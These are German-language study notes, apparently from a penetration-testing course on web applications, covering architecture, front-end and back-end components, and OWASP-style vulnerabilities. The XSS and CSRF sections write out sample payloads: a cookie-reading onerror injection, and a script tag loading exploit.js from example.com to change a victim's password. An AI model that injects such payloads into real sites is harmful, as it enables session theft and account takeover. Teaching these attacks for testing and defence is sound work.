Introduction to Web Applications:
1. Introduction
- Web Applications sind interaktive Anwendungen die auf einem Web-Browser laufen
- Die meistens nehmen dafuer eine Client-Server Architektur
- Web Applications haben meistens front end Komponenten die auf der Client Seite (Was der User sieht) laufen (Browser) und die back end Komponente (Web Application source code) die auf der Server Seite laufen (database/back end server)
- Das erlaubt Firmen Anwendungen in Echtzeit und weltweit zu betreiben und zu bearbeiten 
- Beispeiel hierfuer sind Anwendungen wie Gmail, Amazon und Google Docs

- Web Applications vs. Websites:
	- In der Vergangenheit waren Websites statisch und konnten nicht in Echtzeit bearbeitet werden
	- Die einzige Art die Website zu veraendern bestand darin den Quellcode der Seite anzupassen
	- Diese Art von Websiten wird auch Web 1.0 genannt
	- Die meisten Websiten heutzutage sind im Web 2.0 und sind Web Anwendungen die dynamische Inhalte und User Interaktionen anbieten koennen.

- Web Applications vs. Native Operating System Applications:
	- Web Anwendungen sind im Vergleich zu Betriebssytemen Plattform unabhaengig
	- Die Anwendungen muessen nicht installiert werden sondern werden auf einem remote Server ausgefuehrt
	- Ein weiterer Vorteil von Web Anwendungen ist das jeder mit der gleichen Version arbeiten
	- Die Anwendungen koennen immer wieder geupdatet werden
	- Betriebssystem Anwendung laufen schneller und koennen besser Software Bibliotheken benutzten
	- Hybrid Web Anwendungen haben in letzter Zeit mehr Auftrieb, diese laufen auf dem Betriebssystem und benutzten moderne Frameworks laufen aber direkt auf Hardware udn sind daher besser

- Web Application Distribution:
	- Es gibt viele Open-Source Web Anwendungen die konfigurierbar sind wie:
		- WorkPress
		- OpenCart
		- Joomla

	- Es gibt aber auch Closed Source Web Anwendungen:
		- Wix
		- Shopify
		- DotNetNuke

- Security Risks of Web Applications:
	- Da Wen Anwendungen von ueberall aufgerufen werden koennen, sind sie auch von ueberall angreifbar
	- Es gibt viele automatisierte Werkzeuge fuer das scannen und angreifen von Web Anwendungen
	- Sicherheit fuer Web Anwendungen ist heutzutag eines der wichtigsten Punkte die es gibt
	- Eine oft benutzte Methode beim testen von Web-Anwendungen ist der OWAWP Testing Guide (https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing) 
	- Beim Frontend faengt man die Fehlersuche an indem nach Sentive Data Exposure und Cross Site Scripting Schwachstellen gesucht wird
	- Nachem die Frontend Komponente getestet wurde wird die Interaktion zwischen dem Browser und dem Webserver getestet
	- Getestet wird immer in 2 Phasen eingeloggt und nicht-eingeloggt

- Attacking Web Applications:
	- Nahezu jede Firma hat eine oder mehrere Web Anwendungen
	- Ein simple Codeaenderung kann zu vielen Schwachstellen fuehren
	- Verschiene Arten von Fehlern mit Beispielen:
		- SQL Injection: Beschaffung von Active Directory Usernames und ausfuehren von Passwort Spraying attacken
		- File Inclusion: Lesen von Quellcode um versteckte Seiten oder weiter Funktionalitaeten zu finden um fremden Code auszufuehren
		- Unrestricted File Upload: Datei zu benutzten um Zugriff auf weitere Bereiche zu erlangen
		- Insecure Direct Object Referencing: Wenn access control nicht funktioniert koennen Dateien von anderen Usern aufgerufen werden wie /user/701/edit-profile wechseln zon 701 zu 702 und so einen User editieren
		- Broekn Access Control: Wenn in der URL die Rolle gesetzt wird kann man somit die Rolle eines Users aendern wenn diese selber im Programm nicht ueberprueft wird

2. Web Application Layout:
- Web-Anwendungen sind meistens alle anders aufgebaut
- Web-Anwendungen bestehen aus 3 Kategorien:
- Web Application Infrastructure:
	- Web Anwendungen koennen verschiedene Setups benutzten
	- Diese Setups nennt Models und koennen in 4 verschiedene Arten unterteilt werden:
	Client-Server, One Server, Many Server - One Database, Many Servers - Many Databases
	- Client-Server:
		- Web Anwendungen wenden of das Cient-Server Modell an
		- Ein Server hostet die Web Anwendung und verteilt diese an alle Clienten
		- In diesem Modell gibt es zwei Typen von Komponenten, zum einen das Frontend welches auf dem Client(Browser) laeuft und zu anderen das Backend welches auf dem Server laeuft
	- One Server:
		- In dieser Architektur wird die gesamte Web-Anwendungen auf einem Server gehostet.
		- Die Implementierung dieser Loesung ist einfach aber riskant
		- Wenn eine Web Anwenudung auf diesem Server kompromiert ist sind alle Daten fuer der Web-Anwendung in Gefahr
		- Wenn es dazu kommen sollte, dass der Webserver offline ist sind alle Web-Anwendungen auf diesem Server nicht erreichbar
	- Many Servers - One Database:
		- Dieses Modell besteht aus mehreren Servern diese senden Anfragen an die Datenbank weiter
		- Die Server koennen als Backup vorgehalten werden oder koennen seperiert werden damit die anderen Server entlastet werden
		- Der Vorteil an diesem Modell ist die Segmentierung
		- Wenn ein Server befallen ist, funktionieren die anderen Server vollstaendig
	-  Many Servers - Many Databases:
		- Die Daten von Web-Anwendungen werden in verschiedenen Datenbanken gespeichert 
		- Diese Art von Modell ist sehr redundant
		- Wenn eine Datenbank/Webserver nicht mehr erreichbar ist kann die Arbeit von den anderen uebernommen werden
		- Fuer die Sicherheit ist diese Art von Architektur am besten wobei es sich um die schwierigste Implementierung handelt
	- Ausser diesem Modellen gibt es noch serverless Webanwendungen oder Webanwendungen die microservices benutzten

- Web Application Components:
	- Web-Anwendungen koennen eine verschiedene Nummer an Komponenten haben:
		- Client
		- Server
			- Webserver
			- Web Application Logic
			- Database
		- Services(Microservice)
			- 3rd Party Integrations
			- Web Application Integration
		- Functions (Serverless)

- Web Application Architecture: 
	- Die Komponenten einer Web-Anwendung gehoeren einer der 3 Layer an:
		- Presentation Layer: Erlaubt Kommuikation zwischen Anwendung und System. Durch durch den Clienten aufgerufen werden via Browser schickt HTML, Javascript und CSS Dateien zurueck.
		- Application Layer: Diese Layer stellt sicher, dass Anfragen vom Client korrekt verarbeitet werden. Verschiedene Kriterien wie Authoritaet, Rechte usw werden geprueft und dann Daten dem Clienten zu schicken.
		- Data Layer: Arbeitet eng mit dem Application Layer zusammen und stellt fest ob und wo die Daten gespeichert sind.

- Microservices:
	- Sind unabhaengige Komponenten von Web-Anwendungen die in den meisten Faellen nur fuer eine Aufgabe gebraucht werden
	- Aufgaben koennten folgende sein: Registrierung, Suche, Bezahlung, Bewertung, Rezension
	- Die Komponenten kommunizieren miteinandere und mit dem Client.
	- Die Kommunikation zwischen den Diensten ist zustandslos Anfrage und Antwort sind unabhaengig voneinander. Die Daten werden seperat gespeichert.

- Serverless:
	- Gibt Firmen die Moeglichkeit ohne Infrastruktur eine Web-Anwendung mit stateless computing container (Docker usw). Jegliche Verwaltung von Server liegt bei dem Plattformbetreiber wie AWS, GCP, Azure

- Architecture Security:
	- Die Architektur von System zu verstehen ist fundamental fuer die Sicherheit von modernen Web-Anwendungen
	- In manchen Faellen sind Schwachstallen der Fehler von der Software Architektur und nicht von der Programmierung

3. Frondend vs. Backend
- Frontend:
	- Das Frontend beinhaltet den Userkontent der direkt im Browser dargestellt wird
	- Meistens besteht der Inhalt aus HTML, CSS und Javascript

- Backend:
	- Das Backend beeinhaltet die Logik der Web-Anwendung die auf dem Server ausgefuehrt wird
	- Es gibt 4 Backend Komponenten fuer Web-Anwendungen:
		- Backend Server: Die Hardware und das Betriebssystem auf dem Linux, Windows oder Container laufen
		- Web Server: Web Server behandeln die HTTP Anfragen und Verbindungen wie Apache, NGINX
		- Database: Datenbanken speichern und rufen die Web-Anwendungen Daten ab. 
		- Development Framework: Werden benutzt um Web-Anwendungen zu programmieren. Manche Frameworks beeinhalten PHP, Java, Python, Javbascript und NodeJs

- Securing Front-/Backend:
	- Wenn der gesamte Code vorgegeben ist handelt es sich um Whitebox Pentesting
	- Wenn der Code nicht bekannt ist handelt es sich um Blackbox Pentesting
	- Top 10 Schwachstellen fuer Web-Anwendungen (https://owasp.org/www-project-top-ten/)

###################################################################################################
Front End Components:
1. Hyper Text Markup Language (HTML):
	- HTML enthaelt alle Basis Element inklusive Titel, Formulare, Bilder und viele andere Elemente
	- Der Browser interpretiert die Elemente und stellt sie fuer den Enduser da
	- HTML Elemente werden in einer Baum-Form dargestellt aehnlich wie XML
	- Jedes HTML-Element kann andere Elemente enthalten, daas Main Element enhaelt alle anderen Element

- URL Encoding:
	- Konvertiert Zeichen in ein Format, dass ueber das Internet verschickt werden kann

- Usage:
	- Das Head Element enthaelt alle Elemente die nicht dargestellt werden sollen
	- Die Hauptelemente befinden sich im Body
	- Andere wichtige Element sind style indem sich CSS befindet und script indem sich Javscript befindet
	- Jedes dieser Elemente wird Document Object Model(DOM) gennant
	- Das DOM ist in drei Teile getrennt:
		- Core DOM
		- XML DOM
		- HTML DOM

2. Cascading Style Sheet (CSS):
	- Ist eine Stylesheet Sprache die zum formatieren und zum stylen von HTML Elementen genutzt wird

3. JavaScript:
	- Javascript ist eine der meist genutzten Sprache der Welt und wird meistens fuer Web-Development genutzt
	- Es kann fuer Front- und Backend benutzt werden
	- Javascript wird fuer die Funktionalitaet verwendet
	- Usage:
		- Web-Anwendungen bauen sehr stark auf Javascript
		- Mit Javascript koennen HTTP Anfragen automatisiert werden
		- Jeder moderne Web Browser ist in der Lage Javascript Code auszufuehren

	- Frameworks:
		- Framework erlaubt es vorgefertigte Funktionen zu benutzten wie Login, User Registrierung usw.
		- Beispeiel fuer Frameworks sind Angular, React, Vue, jQuery

###################################################################################################

Front End Vulnerabilities
1. Sensitive Data Exposure:
- Schwachstellen im Frontend hat wenig Auswirkung auf das Backend System und fuehrt in den meisten Faellen nicht zu dauerhaften Schaeden
- Schwachstellen auf der Seite des Frontends setzen den User in Gefahr. Wenn eine Frontend Schwachstelle einen Admin User aushebelt koennte dies zu unbefugten Zugriff, Zugriff auf sensible Daten fuehren usw
- Die meisten Penetrationstest von Web-Anwendungen sind auf das Backend bezogen, es ist ausserdem wichtig das Frontend zu testen 
- Manchmal enthaelt der Source Code der Website credentials, hashes oder andere sensible Daten

- Prevention:
	- Der Source Code sollte nur erforderlichen Code enthalten.
	- Entwickler benutzten JavaScript Obfuscation um die Chance fuer eine aufdeckung von sensiblen Daten zu reduzieren

2. HTML Injection:
- HTML Injections tauchen auf wenn nicht ueberpruefter User Input dargestellt wird
- Wenn der User HTML Code abschicken kann dieser Code auch boesartig sein 
- Beispiel: <a href="http://www.hackthebox.com">Click Me</a> gibt einen Link zu Hackthebox aus

3. Crosst-Site-Scripting (XSS):
- HTML Injection Schwachstellen koennen oft fuer XSS benutzt werden
- XSS attackiert die Client Seite indem Javascript Code injiziert wird
- Es gibt 3 verschiedene Angriffstypen:
	- Refelcted XSS: Tritt auf nachdem Usereingabe verarbeitet worden ist
	- Stored XSS: Tritt auf wenn Usereingabe in einer Datenbank gespeichert wird und nach Anfrage aus der Datenbank ausgegeben wird
	- DOM XSS: Tritt auf wenn Usereingabe direkt im Browser in ienem HTML Objekt geschrieben wird

- Beispiel fuer ein DOM XSS Exploit:
	- Eingabe von #"><img src=/ onerror=alert(document.cookie)>
	- Gibt den Cookie zurueck

4. Cross-Site Request Forgery (CSRF):
- Benutzt CSS Schwachstellen um API Aufrufe zu taetigen
- Kann API Aufrufe als der User taetigen der derzeitig angemeldet ist
- Eine verbreitete Attacke ist durch ein Script sofort das Passwort zu wechseln
- Wenn das Opfer eine gefaehrderte Seite ansieht mit Javascript CSRF Payload ansieht wird der Code automatisch ausgefuehrt
- Um den Angriff durchzufuehren muss der Angreifer eine Datei in die Eingabe abgeben
- Beispiel "><script src=//www.example.com/exploit.js></script>
- Die Datei exploit.js fuehrt dann den Wechsel des Passworts durch

- Prevention:
	- Im Backend sollte die Usereingabe gefilert werden, ausserdem ist es auch wichtig im Frontend die Nutzereingabe zu filtern und zu desinfizieren
	- 2 Hauptkontrollen sollte auf Nutzereingaben angewendet werden: 
		- Sanitization: Entfernen von Spezialzeichen aus der Userinput bevor dieser dargestellt wird
		- Validation: Sicherstellen, dass der Userinput das erwartete Format hat
	- Ein anderer Weg Injections zu verhindern ist eine Web Application Firewall (WAF)
	- Aber auch WAF koennen umgangen werden deswegen ist es am besten gute Code Practices zu haben
	- Fuer CSRF gibt es bei moderneren Browsern haben anti-CSRF Massnahmen die automaitsches ausfuehren von Javascript Code verhindern
	- Der OWASP hat eine Liste von Preventionsmassnahmen (https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

###################################################################################################
Back End Components:
1. Back End Servers:
- Der Backend Server ist die Hardware und das Betriebssystem worauf die Anwendungen die zum laufen der Web-Anwendungen benoetigt wird laufen

- Software:
	- Der Backend Server besteht aus 3 verschiedenen Backend Komponenten:
		- Webserver
		- Database
		- Development Framework
	- Andere Software Komponenten erhalten vielleicht Hypervisor, Container und WAFs

2. Web Servers:
- Ein Webserver ist eine Anwendung die auf dem Backend Server laeuft und den HTTP Traffic vom User in zu verschiedenen Seiten routet
- Webserver laufen meistens auf TCP Ports 80,443

- Workflow:
	- Die HTTP Antwort bei einem erfolgreichen Antwort ist 200 OK, bei einer nicht vorhandenen Website 404 NOT FOUND, bei einer restriksierter Seite ist die Antwort 403 FORBIDDEN
	- Auf dem Webserver koennen verschiedenste Anwendungen laufen 

Apache:
	- Apache oder httpd ist einer der meistgenutzten Server, ueber 40% aller Website laufen auf Apache
	- Kann auf Windows, Linux macOs Server installiert werden
	- Apache wird meistens fuer PHP Web Entwicklung benutzt
	- Apache ist ein Opensource Projekt und wird meistens von kleinen Firmen oder Startups benutzt

NGINX:
	- NGINX ist mit 30% Markanteil der zweitmeist genutzte Webserver
	- NGINX benutzt asynchrone Architektur um so viele Anfragen wie moeglich zu bearbeiten
	- NGINX ist ebenso Opensource

(Internet Information Services) IIS:
	- IIS ist der Webserver von Microsoft der auf Microsoft Windows Server laeuft und 15% des Markanteils hat
	- Es ist optimiert um mit Active Directory zusammen zuarbeiten
	- Hostet meistens Web-Anwendungen die auf dem .NET Framework aufbauen

3. Databases:
- Datenbank speichert Daten um sie spaeter abzurufen
- Es gibt verschiedene Charakteristiken auf die Entwickler schauen: Geschwindigkeit, Groesse, Skallierbarkeit und Kosten

- Relation(SQL):
	- Relationale Datenbanken speichern Daten in Tabellen, Zeilen und Spalten
	- Jede Tabelle hat einen eizigartigen Key welcher zum verbinden von verschiedenen Modellen genutzt werden
	- Die Sprache mit der relationale Datenbanken geschrieben werden heisst SQL
	- Beispiele fuer relationale Datenbanken waeren:
		- MySQL, MSSQL, Oracle, PostgreSQL

- Non-relational(NoSQL):
	- Benutzt keine Tabellen, Spalten oder Zeilen, Beziehungen oder Primaerschluessel
	- NoSQL sind gut skalierbar und sehr flexibel
	- Daten die nicht sehr strukturiert sind ist eine NoSQL Datenbank eine gute Wahl
	- Es gibt 4 verschiedene Modelle fuer NoSQL Datenbanken:
		- Key-Value, Document-Bases, Wide-Column, Graph

4. Development Frameworks & APIs: 
- Es gibt viele Frameworks wie Express(Javascript), Django(Python), Rails(Ruby) usw

- Web APIs:
	- Eine API ist ein Interface innerhalb einer Anwendung die aussagt wie eine Anwendung mit einer anderen Anwendung kommunizieren kann
	- API Standards sind SOAP oder REST

- Simple Objects Access(SOAP):
	- Tauscht Daten sendet Anfragen im XML Format und empfaegt Antworten in XML Format
	- SOAP ist nuetzlich um strukturierte Daten wie Klassenobjekte usw zu uebertragen
	- 

- Representational State Transfer(REST):
	- Liefert meist ein JSON Objekt zurueck
	- REST hat verschiedene HTTP Methoden: GET, POST, PUT, DELETE

###################################################################################################
Back End Vulnerabilities:
1. Common Web Vulnerabilities:
	- Wenn Penetrationstest durchgefuehrt werden Schwachstellen identifiziert, manche davon sind schon bekannt diese sind nur der Konfiguration der Entwickler geschuldet
	- Die haeufigsten Schwachstellen (https://owasp.org/www-project-top-ten/)
- Broken Authentication/Access Control:
	- Gehoeren zu demn gefaehrlichsten Schwachstellen einer Web-Anwendung
	- Broken Authentication: Bezieht sich auf eine Schwachstelle mit der man den authentifizierung Prozess umgehen kann
- Broken Accesss Control:
	- Ein normaler User kann die Rechte eines Admins erlangen in die Eingabe gemischt werden
- Malicous File Upload:
	- Ein weiterer Weg ist Code einzuschleusen hochladbare Dateien mit schaedliche Code versehen werden  
- Command Injection:
	- Web Anwendungen fuehren Befehle auf einem Betriebssystem aus, hierbei koennen auch anderen Anweisungen hinzugefuegt werden um andere Befehle mitauszufuehren
- SQL Injection(SQLi):
	- Eine andere Schwachstelle ist SQLi hierbei kann die Anfrage geaendert werden
	- Wenn die Eingabe nicht gefiltert ist koennte ein anderer SQL Befehl ausgefuehrt werden

2. Public Vulnerabilities:
- Die schlimmsten Schwachstellen sind extern attackiert werden koennen und ein Angreifer dadurch die Kontorlle ueber den Backend Server erlangen kann

Public CVE:
	- Die meisten Webanwendungen sind oeffentlich aufrufbar, daher werden sie von vielen Organisationen und Experten geprueft
	- Wenn die Version der Webanwendung identifiziert wurde, kann eine Schwachstelle in Datenbanken gesucht werden.
		- https://www.exploit-db.com/
		- https://www.rapid7.com/db/
		- https://www.vulnerability-lab.com/

- Common Vulnerability Scoring System(CVSS):
	- Der CVSS ist ein Industriestandard der den Schweregrad einer Schwachstelle misst

- Backend Server Vulnerability:


